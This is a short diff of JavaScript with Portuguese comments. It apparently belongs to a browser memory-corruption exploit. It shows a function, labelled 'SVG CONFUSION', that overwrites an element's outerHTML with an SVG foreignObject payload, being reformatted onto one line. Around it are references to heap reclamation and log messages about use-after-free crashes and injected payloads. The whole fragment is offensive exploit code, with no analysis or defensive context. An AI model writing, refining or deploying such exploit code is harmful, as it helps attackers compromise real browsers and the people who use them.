@@ -62,14 +62,12 @@ function reclaim(size){
 
 // ==========================
 // 💥 SVG CONFUSION (100% INALTERADO)
+// ==========================
+// 💥 SVG CONFUSION (MINIFICADO)
 function inject(child){
     try{
-        child.outerHTML = `
-        <svg>
-            <foreignObject width="100%" height="100%">
-                <div xmlns="http://www.w3.org/1999/xhtml">AAAA</div>
-            </foreignObject>
-        </svg>`;
+        // Linha única, sem espaços ou "enters" inúteis!
+        child.outerHTML = `<svg><foreignObject width="100%" height="100%"><div xmlns="http://www.w3.org/1999/xhtml">AAAA</div></foreignObject></svg>`;
         log("[*] payload injected");
     }catch(e){
         log("[UAF] inject crash");
